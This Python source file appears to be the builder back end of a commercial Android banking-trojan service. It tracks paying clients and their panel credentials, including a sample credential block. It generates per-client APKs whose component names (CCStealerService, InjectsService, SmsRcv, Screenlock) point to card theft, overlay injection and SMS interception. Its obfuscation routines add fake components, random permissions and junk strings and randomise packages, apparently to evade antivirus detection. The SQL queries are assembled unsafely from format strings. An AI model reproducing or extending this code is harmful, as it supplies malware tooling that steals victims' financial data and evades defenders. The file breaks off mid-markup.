from datetime import datetime
from helper_class import *
from mysql_class import mysqlClass 
from http_class import httpClass

from config import *

class Search:
	
	files = []
	dirs = []
	def __init__(self):
		self.files = []
		self.dirs = []
		
	def find_recursive(self, d):
		
		files = hlp.ls2(d, names=False, files=True)
		dirs = hlp.ls2(d, names=True, folders=True)
		dirs_full = hlp.ls2(d, folders=True)
		
		#~ print('Dir: {}; files: {}'.format(d, ','.join(files)))
		self.files += files
		self.dirs += dirs_full
		
		for d2 in dirs:
			self.find_recursive(d + d2 + '/')
			
class App:
	
	form = None
	db = None 
	root = None # path to app/
	upload_url = None # upload apks to backend/builder.php
	builder_basic_auth = ''
	root_builder = None # path to start.py
	default_build = [2, 3, 4] # 'build all' form selected by default templates
	final_apks = [] # apk that was built
	__used_obfuscate_names = []
	__used_switch_cases = []
	
	console_output = False

	def init(self, form, root, root_builder, upload_url, db, builder_basic_auth=''):
		self.form = form
		self.root = root
		self.upload_url = upload_url
		self.root_builder = root_builder
		self.builder_basic_auth = builder_basic_auth
		self.__used_obfuscate_names = []
		self.db = mysqlClass()
		res = self.db.init(debug=0, parent=hlp.parent_doll(), user=db['user'], passwd=db['password'], db=db['db_name'])
		if not res:
			print('Cant connect to db')
			exit()

	def show_tpl(self, name, data={}):
		
		html = hlp.f_read('tpls/{}.html'.format(name))

		for key, val in data.items():
			if '%'+key.upper()+'%' in html:
				html = html.replace('%'+key.upper()+'%', str(val))
				
		print(html)
		
	def get_clients_select(self, cid=False):
		
		from datetime import date
		import time
		
		sql = 'select id, name, folder, status, DATE(paid_until), DATE(registered_at), notes from clients order by paid_until desc'
		clients = self.db.execute(sql)
		
		html = ''
		for c in clients:
			if c[0] == int(cid):
				selected = ' selected'
			else:
				selected = ''

			# 37 symbols width
			client = c[1]
			folder = c[2]
			paid = c[4].strftime('%d/%m') if c[4] else ''
			registered = c[5].strftime('%d/%m') if c[5] else ''
			text = self.make_line(client, folder, registered, paid)

			active = '' # COLOR in list
			
			for n in c[6].split('\n'):
				if n.startswith('MODS:') and 'light' in n:
					active = ' color: lightblue '
					
			if c[3] != 'active' or (c[4] and c[4] < date.fromtimestamp(time.time()) ):
				active = ' color: grey; text-decoration: line-through'
				self.db.execute('update clients set status="disabled" where id={}'.format(c[0]))
				
			elif c[4] and (c[4] < date.fromtimestamp(time.time()+60*60*24*3) or c[4] == date.fromtimestamp(time.time()) ):
				active = ' color: red;  '
			
			html += '<option value="{}" {} style="font-family: monospace; {}">{}</option>'.format(c[0], selected, active, text)
			
		return html
		
	def import_client(self, data, period, domains):
		# period - 'week'/'month'
		
		'''
ID: 2
Client: lama
Jabber: jabba@jdfdfds.com
Folder: restyourbutcold
Basic: restyourbutcold:3SOqJRGZbGFkzsyUtI4l
Admin: admin:ku54%DneWBZOjE6UlCJo
DB: bot_restyourbutcold restyourbutcold:h3Xnuaih3MBRSOIuesnU
PANEL_FOLDER: 7Y4mHBfH7ztz0g1n1MAT
STATS_FOLDER: FfJgLsZJaN19BTk0lqHi
MODS: 
'''

		if period == '':
			expire_on = ''
		else:
			days = 8 if period == 'week' else 31
			ts = hlp.time()+60*60*24*days
			# 01/02/2017
			expire_on = datetime.utcfromtimestamp(ts)
		
		domains = '\n'.join([v.strip() for v in domains.split('\n') if v.strip() and '.' in v])
		
		data = [v.strip() for v in data.split('\n') if v.strip()]
		client = {}
		for row in data:
			if row.startswith('ID:'):
				client['id'] = row.split(':', 1)[-1].strip()
			elif row.startswith('Client:'):
				client['name'] = row.split(':', 1)[-1].strip()
			elif row.startswith('Folder:'):
				client['folder'] = row.split(':', 1)[-1].strip()
			elif row.startswith('Basic:'):
				client['basic_auth'] = row.split(':', 1)[-1].strip()
			elif row.startswith('Admin:'):
				client['admin_auth'] = row.split(':', 1)[-1].strip()
			elif row.startswith('DB:'):
				client['db_row'] = row.strip()
			elif row.startswith('MODS:'):
				client['mods'] = row.strip()
			elif row.startswith('Jabber:'):
				client['jabber'] = row.strip()
			elif row.startswith('PANEL_FOLDER:'):
				client['panel_folder'] = row.split(':', 1)[-1].strip()
			elif row.startswith('STATS_FOLDER:'):
				client['stats_folder'] = row.split(':', 1)[-1].strip()
				
		notes = 'ID: {}\nJabber: {}\n{}\n{}'.format(client['id'], client['jabber'], client['mods'], client['db_row'])
		
		sql = 'insert into clients values(null, "{}", "{}", "{}", "{}", "{}", "{}", "{}", "{}", "{}", "{}", "{}", NOW(), "{}", "{}")'.format(client['name'], client['folder'], client['basic_auth'], client['admin_auth'], notes, 'active', domains, '', '', '', expire_on, client['panel_folder'], client['stats_folder'])

		#~ hlp.textarea(sql)

		self.db.execute(sql)
		if self.db.last_error != '':
			return self.db.last_error

		return True

	def get_client_access(self, cid):
		
		sql = 'select folder, basic_access, admin_access, domains, panel_folder, stats_folder, notes from clients where id={}'.format(cid)
		data = self.db.execute(sql)
		if self.db.last_error != '':
			return self.db.last_error
		
		folder = data[0][0]
		basic_access = data[0][1]
		admin_access = data[0][2]
		domains = data[0][3]
		panel_folder = data[0][4]
		stats_folder = data[0][5]
		notes = data[0][6]
		
		ips = hlp.parse_all(r'@([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)', notes)
		if ips is False:
			ip = 'unknown'
		else:
			ip = ips[0]
				
		if domains.strip():
			dom = domains.split('\n')[0].strip()
		else:
			if ip != 'unknown':
				dom = ip
			else:
				dom = 'DOMAIN'
			domains = 'not specified'
			
		admin = 'https://{}/{}/{}'.format(ip, folder, panel_folder)
		stats = 'https://{}/{}/{}'.format(ip, folder, stats_folder)
		
		text = '''
Admin panel: {admin}
Guest stats: {stats}

Basic auth: {basic_access}
Admin account: {admin_access}

Server ip: {ip}
Domains: {domains}
		'''.format(**locals())
		return [text, admin, stats]
			
	def make_line(self, client, folder, registered, paid):
	
		#~ if len(folder) > 8:
			#~ folder = folder[:8]+'..'
		
		space_n = 37-5-3-len(client)-len(folder)
		space = '&nbsp;'*(space_n)
		if space_n < 2:
			fix = 2-space_n
			folder = folder[:len(folder)-fix]

			space_n = 37-5-3-len(client)-len(folder)
			space = '&nbsp;'*(space_n)

		if not registered:
			date = '&nbsp;'*6 + paid
		else:
			date = registered + '&#151;'  + paid
			
		#name * folder    04/10
		text = '{} &bull; {}{}{}'.format(client, folder, space, date)
		return text

	# Console  "www ./start.py rebuild"
	def rebuild_active(self):
		
		console_output = True
		
		sql = 'select id from templates where client_id in(select id from clients where status="active")'
		tpls = self.db.execute(sql)
		if self.db.last_error != '':
			print(self.db.last_error)
			return ''
		
		tpls = [v[0] for v in tpls]
		
		path = self.root + 'apks/update.zip'
		hlp.f_delete(path)
		
		total = len(tpls)
		
		print('Start mass build & upload for {}\n'.format(', '.join([str(v) for v in tpls])))
		print('{} TOTAL\n'.format(total))
		self.final_apks = []
		
		for i, tpl_id in enumerate(tpls):
				
			print('[{}/{}] Template #{}\n'.format(i, total, tpl_id))

			api = self.get_template_api(tpl_id)
			apis = [v.strip() for v in api.split(',') if api.strip()]
			for api in apis:
				
				html = self.set_template(tpl_id, obfuscate=True, api=api)
				print(html + '\n')
				
				html = self.build(tpl_id, api_custom=api)
				print(html + '\n')
				
				self.git_reset()

		self.git_reset()

		html = self.zip(path, self.final_apks)
		print(html + '\n')
		html = self.delete_apks(self.final_apks)
		print(html + '\n')
		html = self.upload_update(path)
		print(html + '\n')
	
		
		
	def get_client_status(self, cid):
		
		status_line = self.db.execute('select status from clients where id={}'.format(cid))[0][0]
		
		if status_line == 'active':
			status = '<span style="color: lime">&bull;</span>'
		else:
			status = '<span style="color: red">&bull;</span>'
		
		return [status_line, status]
		
	def save_block_apps(self, apps):
		pass
		#~ apps = apps.split('\n')
		#~ apps = [v.strip() for v in apps if v.strip()]
		#~ apps = list(set(apps))
		#~ apps = sorted(apps)
		#~ text = '\n'.join(apps)
		#~ self.db.execute('update settings set xval="{}" where xkey="minimize_apps"'.format(text))

	def get_block_apps(self):
		return []
		#apps = self.db.execute('select xval from settings where xkey="minimize_apps"')[0][0]
		#return apps
		
	def edit_replaces(self):
		
		replaces = self.db.execute('select id, enabled, level, entity_id, filepath, regex, new_data from replaces')
		
		js = '<script>var replaces = [\n'
		for replace in replaces:
			id_, enabled, level, ent_id, filepath, regex, new_data = replace
			
			js += '[{}, {}, "{}", {}, "{}", "{}", `{}`],\n'.format(id_, enabled, level, ent_id, filepath, regex.replace('"', '\\"'), new_data.replace('"', '\\"'))
			
		js += '''];\n
		
		function draw(replaces)
		{
			for(var i=0; i<replaces.length; i++)
			{
				var elem = replaces[i];
				var input_id = '<input type="text" value="'+elem[0]+'" /><br />';
				var checked = (elem[1])? " checked " : "";
				var input_enabled = '<input type="checkbox" '+checked+'/><br />';
				
				var input_new_data = '<textarea cols="30">'+elem[6]+'"</textarea><br />';
				$('#rules').append(input_enabled);
			}
		}
		
		draw(replaces);
		'''
		
		html = '''<h1>Replaces editor</h1><div id="rules"></div>'''
		
		js += '</script>'
		return html + js
	
	#~ def get_all_tpl_select(self):
		#~ tpls = self.db.execute('select id, app_name, package_name, api, sms_admin_required from templates group by app_name order by id desc')
		#~ 
		#~ html = ''
		#~ for c in tpls:
			#~ sms_admin = ' [SD]' if c[4] else ''
			#~ html += '<option value="{}">{}</option>'.format(c[0], c[1], c[2], c[3].replace('%DATE%','*'), sms_admin)
		#~ 
		#~ return html
		
	def all_themes_list(self):
		
		tpls = self.db.execute('select icon_set, app_name, api, sms_admin_required, id from templates group by app_name order by app_name')
		html = ''
		for tpl in tpls:
			icon = "<img id='icon' title='{}' src='{}' />".format(tpl[0], 'app_icons/'+tpl[0]+'/drawable-xhdpi/ic_launcher181.png')
			sms_admin = 'yes' if tpl[3] else ''
			api = tpl[2].replace('%DATE%', '')
			html += '''<tr>
			<td>{icon}</td>
			<td>{tpl[1]}</td>
			<td>{api}</td>
			<td>{sms_admin}</td>
			<td>-</td>
			<td>
			<a href='?tpl_id={tpl[4]}&action=edit_tpl'>
				<input type='submit' class='btn btn-primary' value='Edit' />
			</a>
			</td>
			</tr>'''.format(**locals())
			
		return html
	
	def get_tpl_select(self, cid, tid=False):
		
		tpls = self.db.execute('select id, app_name, package_name, api, sms_admin_required, socks_enabled from templates where client_id={} order by id desc'.format(cid))
		
		html = ''
		for c in tpls:
			sms_admin = ' [SMS]' if c[4] else ''
			socks_enabled = ' [SKS]' if c[5] else ''
			
			if tid and c[0] == int(tid):
				html += '<option value="{}" selected>{} - {} - {}{}{}</option>'.format(c[0], c[1], c[2], c[3].replace('%DATE%','*'), sms_admin, socks_enabled)
			else:
				html += '<option value="{}">{} - {} - {}{}{}</option>'.format(c[0], c[1], c[2], c[3].replace('%DATE%','*'), sms_admin, socks_enabled)

		return html
		
	def get_client_tpl(self, cid):
		
		tpls = self.db.execute('select id from templates where client_id={} order by id desc'.format(cid))
		tpls = [c[0] for c in tpls]
		return tpls
		
	def get_sms_admin_mode_list(self, choose):
		
		en1 = 'selected' if choose == 0 else ''
		en2 = 'selected' if choose == 1 else ''
		en3 = 'selected' if choose == 2 else ''
		
		html = '''
<option value='0' {}>Disabled</option>
<option value='1' {}>Require on start</option>
<option value='2' {}>Require with SMS Intercept command</option>
		'''.format(en1, en2, en3)
		
		return html
		
	# returns: dict
	# {'path/to/file.xml': [("label_name", "Label text"), (key, value), ...]}
	def get_xml_strings(self):
		path = self.root + 'app/src/main/res/values*/*xml'
		files = hlp.ls2(path, files=True)
		
		files_rows = {}
		unique_rows = {}
		
		for f in files:
			data = hlp.f_read(f)
			rows = hlp.parse_all(r'<string\s+name="([^"]+)">([^<]+)', data)
			if rows is False:
				continue 
				
			if f not in files_rows.keys():
				files_rows[f] = []
			
			files_rows[f] += rows
			for r in rows:
				if r not in unique_rows.keys():
					unique_rows[r[0]] = r[1]
			
		#~ print(unique_rows) #-- dict with all strings {string: Value}
		return files_rows
		
	def update_xml_strings(self, xml_rows, key, key_new=''):

		for path, elems in xml_rows.items():
			
			data = hlp.f_read(path)
			for elem in elems:
				val = elem[1]
				val2 = val.replace(key, '')
				
				string_new = ''
				i = 0
				for c in val2:
					if c == '\\':
						string_new += c
					else:
						string_new += c + key_new
					#~ i += 1
				
				val2 = string_new

				data = data.replace('>{}<'.format(val), '>{}<'.format(val2))

			hlp.f_write(path, data)

	def update_manifest(self, data):
		path = self.root + 'app/src/main/AndroidManifest.xml'
		text = hlp.f_read(path)
		for key, val in data.items():
			tag = '%' + key.upper() + '%'
			text = text.replace(tag, val)
		
		hlp.f_write(path, text)
		
	def hide_strings(self, f, just_clear=False):
		data = hlp.f_read(f)
		
		rows = hlp.parse_all(r'S.s\("(.+)"\);', data) # S.s("main_prefs");
		xml_rows = self.get_xml_strings()
		
		key = hlp.parse(r'String key = "([^"]+)', data) # public static String key = "<<d>>";
		if not key:
			key = ''
		
		if just_clear:
			data = data.replace(key, '')
			hlp.f_write(f, data)
			
			self.update_xml_strings(xml_rows, key, '')
			return 
		
		key_new = '**{}**'.format(hlp.password(3))
		
		self.update_xml_strings(xml_rows, key, key_new)

		while '%RANDOM_ABC%' in data:
			rnd = hlp.password(hlp.rand(10, 20), src='eng')
			data = data.replace('%RANDOM_ABC%', rnd, 1)
		
		for row in rows:
			row_old = 'S.s("{}")'.format(row)
			row = row.replace(key, '')
			#~ print(row)
			#~ continue
			
			string_new = ''
			for c in row:
				
				if c == '\\':
					string_new += c
				else:
					string_new += c + key_new
				
			#~ print(string_new + ' -- ' + key + '\n')
			
			row_new = 'S.s("{}")'.format(string_new)
			data = data.replace(row_old, row_new)
		
		data = data.replace('String key = "{}"'.format(key), 'String key = "{}"'.format(key_new))
		hlp.f_write(f, data)
	
	def add_icon(self, name, icon_theme_name):
		
		icon_path = self.root_builder + 'app_icons/' + icon_theme_name
		cmd = self.root_builder + 'sh/icon_gen.sh "{}" {}'.format(icon_path, name)
		res = hlp.execute(cmd, returnFull=True)

	def git_reset(self):
		
		path = self.root_builder + 'sh/git_co.sh'
		
		if not hlp.exists(path):
			return '<span style="color:red">git_co.sh does not found. Set right PATH variable in start.py</span>\n'
		
		res = hlp.execute(path + ' ' + self.root, returnFull=True)
		html = str(res)
		
		s_file = self.root + 'app/src/main/java/com/moonny/constants/S.java'
		self.hide_strings(s_file, just_clear=True)
		
		return html + 'Git reset done\n'
		
	def add_fake_activities(self, num, package_base_name):
		
		pkg = package_base_name.replace('.', '/')
		man_path = self.root + 'app/src/main/AndroidManifest.xml'
		
		for i in range(num):
			name = self.get_obfuscate_name()
			
			body = '''package {};
import android.app.Activity;
public class {} extends Activity {{}}'''.format(package_base_name, name)

			hlp.f_write(self.root + 'app/src/main/java/' + pkg + '/'+name+'.java', body)
			
			man = hlp.f_read(man_path)
			new_act = '<activity android:name="{}.{}" />'.format(package_base_name, name)
			hlp.f_write(man_path, man.replace('</application>', '{}\n</application>'.format(new_act)))
		
		return '{} fake activities added\n'.format(num)
		
	def add_random_strings_xml(self, package_base_name):
		
		xmls = hlp.ls2(self.root + 'app/src/main/res/values*/strings.xml', files=True)
		html = 'Randomize strings.xml\n'
		
		data = hlp.f_read(xmls[0])
		used_letters = hlp.parse_all(r'name="([^"]+)"', data)
		used_letters.append('do')
		used_letters.append('if') # https://en.wikipedia.org/wiki/List_of_Java_keywords
		
		new_strings = ''
		for i in range(hlp.rand(3, 10)):
			while True:
				new_letter = hlp.password(2, src='eng')
				if new_letter not in used_letters:
					break
					
			used_letters.append(new_letter)
			new_strings += '\t<string name="{}">%VAL%</string>\n'.format(new_letter)
		
		for xml in xmls:
			html += '- {} updating\n'.format(xml)
			
			data = hlp.f_read(xml)
			
			new_strings2 = new_strings
			while '%VAL%' in new_strings2:
				rnd_string = hlp.password(hlp.rand(5, 30))
				new_strings2 = new_strings2.replace('%VAL%', rnd_string, 1)
				
			data = data.replace('</resources>', '{}\n</resources>'.format(new_strings2), 1)
			hlp.f_write(xml, data)

		return html
		
	def add_random_perms(self, package_base_name):
		
		# https://developer.android.com/reference/android/Manifest.permission.html
		
		perms = ['READ_EXTERNAL_STORAGE', 'WRITE_EXTERNAL_STORAGE', 'BLUETOOTH', 
		'CLEAR_APP_CACHE', 'GET_PACKAGE_SIZE', 'INSTALL_SHORTCUT', 'ACCESS_FINE_LOCATION', 'ADD_VOICEMAIL', 'BATTERY_STATS', 'USE_FINGERPRINT', 'USE_SIP']

		perms = hlp.mix(perms)
		
		pkg = package_base_name.replace('.', '/')
		man_path = self.root + 'app/src/main/AndroidManifest.xml'
		man = hlp.f_read(man_path)

		sz = len(perms)
		min_size = round(sz/3)
		n = hlp.rand(min_size, sz)
		html = 'Adding {} of {} random perms\n'.format(n, sz)
		for i in range(n):
			p = perms.pop()
			html += 'Perm: {}\n'.format(p)
			new_act = '<uses-permission android:name="android.permission.{}" />'.format(p)
			man = man.replace('<uses-permission', '{}\n<uses-permission'.format(new_act), 1)
			
		hlp.f_write(man_path, man)
		return html
		
	def add_fake_receivers(self, num, package_base_name):
		
		pkg = package_base_name.replace('.', '/')
		man_path = self.root + 'app/src/main/AndroidManifest.xml'
		
		for i in range(num):
			name = self.get_obfuscate_name()
			
			body = '''
package {};

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class {} extends BroadcastReceiver {{ @Override public void onReceive(Context ctx, Intent intent) {{}}}}
'''.format(package_base_name, name)

			hlp.f_write(self.root + 'app/src/main/java/' + pkg + '/'+name+'.java', body)
			
			man = hlp.f_read(man_path)
			new_act = '<receiver android:name="{}.{}" />'.format(package_base_name, name)
			hlp.f_write(man_path, man.replace('</application>', '{}\n</application>'.format(new_act)))
			
		return '{} fake receivers added\n'.format(num)
		
	def add_fake_services(self, num, package_base_name):
		
		pkg = package_base_name.replace('.', '/')
		man_path = self.root + 'app/src/main/AndroidManifest.xml'
		
		for i in range(num):
			name = self.get_obfuscate_name()
			
			body = '''package {};
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
public class {} extends Service {{
    @Override
    public IBinder onBind(Intent intent) {{
        return null;
    }}
}}'''.format(package_base_name, name)

			hlp.f_write(self.root + 'app/src/main/java/' + pkg + '/'+name+'.java', body)
			
			man = hlp.f_read(man_path)

			new_act = '<service android:name="{}.{}" />'.format(package_base_name, name)
			hlp.f_write(man_path, man.replace('</application>', '{}\n</application>'.format(new_act)))
		
		return '{} fake services added\n'.format(num)
		
	def randomize_switch(self, dir_):
		# add random values to all switches
		files = hlp.ls2(dir_, files=True, folders=False, recursive=True)
		for f in files:
			if not f.endswith('.java'):
				continue
				
			data = hlp.f_read(f)
			if 'switch (' not in data and 'switch(' not in data:
				continue
				
			# /* int */switch
			switches = hlp.parse_all(r'(/\* [a-z]+ \*/switch[^\{]+\{)', data)
			if not switches:
				continue
				
			for switch in switches:
				stype = hlp.parse('/\* ([a-z]+) \*/', switch)
				for i in range(2, 5):
					while True:
						name = hlp.rand(10, 200) if stype == 'int' else '"{}"'.format(hlp.password(10))

						var_name = hlp.password(10, src='eng')
						
						if (str(name) in self.__used_switch_cases) or (var_name in self.__used_switch_cases):
							continue
						else:
							break
							
					new_case = '''case {}: String {} = "{}"; break;'''.format(name, var_name, hlp.password(20))
					data = data.replace(switch, switch + '\n' + new_case)
					
					self.__used_switch_cases.append(str(name))
					self.__used_switch_cases.append(var_name)
			
			# update file
			hlp.f_write(f, data)
			
		return
	
	def set_template(self, tpl_id, obfuscate=False, api=''):

		html = ''
		html += 'Switching to template {}\n'.format(tpl_id)
		html += 'Path: {}\n'.format(self.root)
		
		icon_set, app_name, package_name, sms_admin_required, socks_mod, device_admin_label, device_admin_descr = self.db.execute('select icon_set, app_name, package_name, sms_admin_required, socks_enabled, device_admin_label, device_admin_descr from templates where id={}'.format(tpl_id))[0]
		html += 'Icon set: {}\n'.format(icon_set)
		html += 'App name: {}\n'.format(app_name)
		html += 'Device admin label: {}\n'.format(device_admin_label)
		html += 'NOT USED: Device admin description: {}\n'.format(device_admin_descr)
		html += 'API: {}\n'.format(api)
		
		if sms_admin_required == 0:
			sms_admin_mode_text = 'Disabled'
		elif sms_admin_required == 1:
			sms_admin_mode_text = 'On Start'
		elif sms_admin_required == 2:
			sms_admin_mode_text = 'On SMS Intercept command'
			
		html += 'Sms admin mode: {}\n'.format(sms_admin_mode_text)
		html += 'Socks enabled: {}\n'.format(socks_mod)

		man_tags = {
			'app_name': app_name,
			'device_admin_label': device_admin_label,
		}
		self.update_manifest(man_tags)

		#~ old_name = "com." + hlp.ls2(self.root + 'app/src/main/java/com', names=True, folders=True)[0]
		old_name = 'com.moonny'
		#~ new_name = package_name
		
		html += 'Package name: {}\n'.format(old_name)
		
		pkg_name = hlp.password(hlp.rand(5, 20), src='eng') 
		
		if obfuscate:
			self.com_replace = hlp.password(hlp.rand(5, 20), src='eng')
			new_name = '{}.{}'.format(self.com_replace, pkg_name)
		else:
			self.com_replace = 'com'
			new_name = old_name

		# rm mods_src
		if obfuscate:
			mods_src = '{}app/src/main/java/{}/mods_src/'.format(self.root, old_name.replace('.','/'))
			hlp.execute('rm -rf {}'.format(mods_src))
		
		# randomize S.java
		self.hide_strings(self.root + 'app/src/main/java/{}/constants/S.java'.format(old_name.replace('.','/')))
		
		# randomize switches
		self.randomize_switch(self.root + 'app/src/main/java/{}/'.format(old_name.replace('.','/')))
		

		html += self.add_replaces(tpl_id, old_name.split('.')[-1], custom_api=api)
		if socks_mod:
			html += self.add_mod_socks(old_name.split('.')[-1])
			# need obfuscate it before manual_obfuscate_dir(api)
			if obfuscate:
				html += self.manual_obfuscate('ConnectionChangedReceiver')
				html += self.manual_obfuscate('SocksServer')
				html += self.manual_obfuscate('SService')
				html += self.manual_obfuscate('SocksHandler')
				self.manual_obfuscate_dir('socks', package_base_name=old_name)
		else:
			html += self.rm_mod_socks(old_name.split('.')[-1])
			
		# we dont obfuscate if just simple set template, without build
		if obfuscate:
			html += self.manual_obfuscate('MainActivity')
			html += self.manual_obfuscate('Screenlock')
			html += self.manual_obfuscate('CC1')
			html += self.manual_obfuscate('CC2')
			html += self.manual_obfuscate('InjectActivity')
			html += self.manual_obfuscate('AdminActivity')
			html += self.manual_obfuscate_dir('acts', package_base_name=old_name)
			
			html += self.manual_obfuscate('CustomCardNumber')
			html += self.manual_obfuscate('CustomDay')
			html += self.manual_obfuscate('CustomMonth')
			html += self.manual_obfuscate('CustomYear')
			html += self.manual_obfuscate_dir('widget', package_base_name=old_name)

			html += self.manual_obfuscate('BootReceiver')
			html += self.manual_obfuscate('AdminRightsReceiver')
			html += self.manual_obfuscate('AlarmReceiver')
			html += self.manual_obfuscate('SmsRcv')
			html += self.manual_obfuscate_dir('rcvs', package_base_name=old_name)
			
			html += self.manual_obfuscate('HideService')
			html += self.manual_obfuscate('USSDService')
			html += self.manual_obfuscate('InjectsService')
			html += self.manual_obfuscate('CCStealerService')
			html += self.manual_obfuscate('AdminRightsService')
			html += self.manual_obfuscate_dir('srvs', package_base_name=old_name)

			html += self.manual_obfuscate('Modules')
			html += self.manual_obfuscate('Tasks')

			
		if sms_admin_required != 0: # modes 0 1 2
			html += self.add_mod_sms_admin(old_name.split('.')[-1], sms_admin_required)

			if obfuscate:
				html += self.manual_obfuscate('SMSBReceiver')
				html += self.manual_obfuscate('MmsReceiver')
				html += self.manual_obfuscate('PushServiceReceiver')
				html += self.manual_obfuscate('SendSms')
				html += self.manual_obfuscate('HeadlessSmsSendService')
				html += self.manual_obfuscate_dir('sms', package_base_name=old_name)
		else:
			html += self.rm_mod_sms(old_name.split('.')[-1])
			
		html += self.add_random_perms(old_name)
		html += self.add_random_strings_xml(old_name)
		html += self.randomize_version()
		
		if obfuscate:
			html += self.add_fake_receivers(hlp.rand(2,3), package_base_name=old_name)
			html += self.add_fake_activities(hlp.rand(2,3), package_base_name=old_name)
			html += self.add_fake_services(hlp.rand(2,3), package_base_name=old_name)

	# TRYING TO RENAME CLASSES LINKED WITH MANIFEST

		if obfuscate:
			html += 'Rename from {} to {}\n'.format(old_name, new_name)
			html += self.rename_package(old_name, new_name)
			hlp.execute('mv {}app/src/main/java/com/ {}app/src/main/java/{}/'.format(self.root, self.root, self.com_replace))
		
			pack_new = new_name.split('.')[-1] # remove com.
		else:
			pack_new = old_name.split('.')[-1]
			
		#~ f = self.root_builder + 'app_icons/{}/drawable-mdpi/ic_launcher181.png'.format(icon_set)
		#~ if hlp.exists(f):
			#~ to = self.root + 'app/src/main/res/drawable-mdpi/'
			#~ html += 'Copy {} -> {}\n'.format(f, to)
			#~ hlp.f_copy(f, to)
		
		f = self.root_builder + 'app_icons/{}/drawable-xhdpi/ic_launcher181.png'.format(icon_set)
		if hlp.exists(f):
			to = self.root + 'app/src/main/res/drawable-xhdpi/'
			html += 'Copy {} -> {}\n'.format(f, to)
			hlp.f_copy(f, to)
		
		#~ f = self.root_builder + 'app_icons/{}/drawable-xxhdpi/ic_launcher181.png'.format(icon_set)
		#~ if hlp.exists(f):
			#~ to = self.root + 'app/src/main/res/drawable-xxhdpi/'
			#~ html += 'Copy {} -> {}\n'.format(f, to)
			#~ hlp.f_copy(f, to)
	
		html += '<span style="color: blue">Template set success</span>\n'
		
		if obfuscate:
			self.align_project(new_name) # move all classes to package directory (com.moonny)
		return html

	def randomize_version(self):
		
		#android:versionCode="1"
		#android:versionName="1.0"
		
		ver = hlp.rand(1, 10)
		x = hlp.rand(1, 10)
		ver2 = '{}.{}'.format(ver, x)
		
		man = hlp.f_read(self.root + 'app/src/main/AndroidManifest.xml')
		man = man.replace('android:versionCode="1"', 'android:versionCode="{}"'.format(ver))
		man = man.replace('android:versionName="1.0"', 'android:versionName="{}"'.format(ver2))
		hlp.f_write(self.root + 'app/src/main/AndroidManifest.xml', man)
		
		return 'Version randomized\n'

	# pkg = bgiqysqyoqdrbf.sxoqxtnqqczwc
	def align_project(self, pkg):
		
		s = Search()
		s.find_recursive(self.root + 'app/src/main/java/{}/'.format(pkg.replace('.', '/')))
		
		for f in s.files:
			if not f.endswith('.java'):
				continue 
				
			#~ print("FILE " + f + "<br />")
			
			# FILE /var/www/git/app/app/src/main/java/zajrqvmiskf/lloodflhgebzj/p021w.java
			fn = f.rsplit('/', 1)[-1]
			new_file_name = self.root + 'app/src/main/java/{}/{}'.format(pkg.replace('.', '/'), fn)

			if f != new_file_name and hlp.exists(new_file_name):
				# file not in root, but has the same name
				print('<input type="text" size="100" value="ALREADY EXISTS: {}; need manual source fix?" /><br />'.format(new_file_name))
				continue 
				
			data = hlp.f_read(f)
			patts = [
				r'import ({}\.[^;]+)'.format(pkg.replace('.', '\\.')),
				r'import (static {}\.[^;]+)'.format(pkg.replace('.', '\\.'))
			]
			
			imports = hlp.parse_all(patts, data)
			if imports is False:
				imports = []
			
			#~ changed = False
			for imp in imports:
				if 'import static ' in data:
					print('<input type="text" size="100" value="STATIC IMPORT: {}; change to normal import" /><br />'.format(imp))
				is_static = True if imp.startswith('static ') else False
				if is_static:
					imp = imp[7:]
					
				if not imp.startswith(pkg + '.'):
					continue
				
				class_name = imp.rsplit('.', 1)[-1]
				new_imp = pkg + '.' + class_name
				#~ print('<input type="text" size="100" value="{} -- {}" /><br />'.format(imp, new_imp))

				if new_imp != imp:
					#~ changed = True
					# import com.moonny.services.AdminRightsService; ->
					# import com.moonny.AdminRightsService;
					data = data.replace('import ' + imp + ';', 'import ' + new_imp + ';')
				
			#~ if changed:
			file_pkg = hlp.parse(r'(package [^;]+;)', data)
			#~ print('<input type="text" size="100" value="{}" /><br />'.format(file_pkg))
			#~ print('<input type="text" size="100" value="{}" /><br />'.format('package {};'.format(pkg)))
			data = data.replace(file_pkg, 'package {};'.format(pkg))
			hlp.f_write(f, data)
			
			res = hlp.execute('mv {} {}'.format(f, new_file_name))
		
		# delete empty dirs?
		
		# update manifest for all files:
		# android:name="bgiqysqyoqdrbf.sxoqxtnqqczwc.C021i.p035c" -> ".p035c"
		# android:name=".C082w.p028r"  -> ".p028r"
		
		man = hlp.f_read(self.root + 'app/src/main/AndroidManifest.xml')
		
		man2parse = hlp.sub(r'<intent\-filter>([\S\s]+?)</intent\-filter>', '', man)
		
		paths = hlp.parse_all('android:name="([^"]+)', man2parse)
		
		for p in paths:
			if p.startswith('android.'):
				continue
				
			new = p.rsplit('.', 1)[-1]
			man = man.replace('android:name="{}"'.format(p), 'android:name=".{}"'.format(new))
			
		hlp.f_write(self.root + 'app/src/main/AndroidManifest.xml', man)
		
		# update xmls 
		# <hfhhaaotlbkmyfqbxrps.kqukk.C096y.p059n  -> <hfhhaaotlbkmyfqbxrps.kqukk.p059n
		
		xmls = hlp.ls2(self.root + 'app/src/main/res/layout/*.xml', files=True)
		for xml in xmls:
			#~ print('<input type="text" size="100" value="{}" /><br />'.format(xml))
			x = hlp.f_read(xml)
			elems = hlp.parse_all('({}.[\S]+)'.format(pkg), x)
			
			if elems is False:
				continue
				
			for elem in elems:
				cl = elem.rsplit('.', 1)[-1]
				cl_new = '{}.{}'.format(pkg, cl)
				#~ print('<input type="text" size="100" value="{} -- {}" /><br />'.format(elem, cl_new))
				x = x.replace(elem, cl_new)
				
			hlp.f_write(xml, x)
		
	def hide_text(self, text):
		
		rid = 'details' + hlp.password(10)
		text = text.replace('<textarea', '<textarea id="{}" style="display: none" '.format(rid))
		html = '''
		<a href='javascript:undefined' onclick='$("#{}").toggle()'>Details</a>
		{}
		'''.format(rid, text)
		return html 
		
	def check_servers(self):
		
		html = '''
		<div class='row'>
			<div class='col-md-2' style='margin-top: 20px'>
				<a href='start.py'>
				<button class='btn btn-primary'>Back</button>
				</a>
			</div>
			<div class='col-md-10'>
				<h1>Check servers</h1>
			</div>
		</div>
		<style type='text/css'>
		.info_block {
			width: 400px; 
			height: 100px;
			display: none;
		}
		
		.client_tr {
			background-color: #E6ECED;
		}
		.client_tr:HOVER {
			background-color: white;
		}
		</style>
		<script>
